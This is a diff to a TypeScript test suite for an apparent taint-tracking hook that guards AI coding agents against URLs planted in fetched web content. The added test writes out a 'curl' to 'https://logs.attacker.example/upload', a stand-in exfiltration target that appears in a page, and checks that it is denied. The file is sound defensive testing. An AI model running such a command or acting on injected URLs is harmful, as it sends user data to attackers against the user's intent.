@@ -52,6 +52,7 @@ function makeHookConfig(dir: string): PalizadeConfig {
     hooks: { failMode: "closed", timeoutMs: 30_000, maxInputBytes: 1048576 },
     taint: {
       exposure: { ttlMs: 7_200_000 },
+      userIntent: { enabled: true, ttlMs: 7_200_000 },
       quarantine: { scoreGte: 0.85, turns: 20, ttlMs: 1_800_000 },
       window: { calls: 12, ttlMs: 900_000, maxBytes: 262144, maxDestinations: 256 },
       decode: { maxDepth: 2, maxBytes: 262144 },
@@ -190,6 +191,38 @@ describe("evaluateHookEvent (Claude Code)", () => {
           permissionDecision: "deny"
         }
       });
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("lets a url the user typed through while still denying one only the page mentioned", async () => {
+    const { config, cleanup } = await setup();
+    try {
+      const sessionId = "claude-session-intent";
+      const hook = (event: string, payload: Record<string, unknown>) => evaluateHookEvent({ config, client: "claude-code", event, sessionId, payload: { session_id: sessionId, cwd: process.cwd(), ...payload } });
+      await hook("PostToolUse", {
+        tool_name: "WebFetch",
+        tool_input: { url: "https://news.example/item" },
+        tool_response: { content: [{ type: "text", text: "Status is at https://status.example.com/report and logs at https://logs.attacker.example/upload" }] }
+      });
+      const curl = async (url: string) => (await hook("PreToolUse", { tool_name: "Bash", tool_input: { command: `curl ${url}` } })).output as { hookSpecificOutput?: { permissionDecision?: string } } | undefined;
+      expect((await curl("https://status.example.com/report"))?.hookSpecificOutput?.permissionDecision).toBe("deny");
+      const prompt = await hook("UserPromptSubmit", { prompt: "check https://status.example.com/report for me" });
+      expect(prompt).toMatchObject({ exitCode: 0, output: undefined });
+      expect(await curl("https://status.example.com/report")).toBeUndefined();
+      expect((await curl("https://logs.attacker.example/upload"))?.hookSpecificOutput?.permissionDecision).toBe("deny");
+    } finally {
+      await cleanup();
+    }
+  });
+
+  it("never blocks a prompt, even with a broken config, and answers Cursor with continue", async () => {
+    const { config, cleanup } = await setup();
+    try {
+      const broken = { ...config, taint: { ...config.taint, sqlite: join(config.stateDir, "missing-dir", "\0bad", "taint.sqlite") } };
+      const result = await evaluateHookEvent({ config: broken, client: "cursor", event: "beforeSubmitPrompt", payload: { conversation_id: "c1", prompt: "mail alice@corp.example" } });
+      expect(result).toMatchObject({ exitCode: 0, output: { continue: true } });
     } finally {
       await cleanup();
     }
